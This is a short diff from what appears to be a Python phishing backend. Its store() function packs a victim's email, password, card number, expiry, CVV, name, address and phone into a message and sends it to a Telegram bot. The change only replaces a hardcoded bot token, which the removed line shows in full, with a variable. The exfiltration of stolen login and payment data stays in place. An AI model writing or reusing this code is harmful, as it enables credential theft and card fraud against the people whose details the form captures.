@@ -31,7 +31,7 @@ def store():
     message = f"🔐 Login\nEmail: {email}\nPassword: {password}\n Card number: {cardNum}\n expiry month: {expiryMonth}\n expiry year: {expiryYear}\n Name: {nameOnCard}\n cvv: {securityCode}\n Address: {houseNumber} {streetAddress} {postcode}\n Number: {phoneNum} \n Card Name: {cardName}"
     
 
-    url = f"https://api.telegram.org/bot{'7886311227:AAGGZH7NFdg1wQedTL6d3r_0ON4y3-UfBts'}/sendMessage"
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
     'chat_id': CHAT_ID,
     'text': message
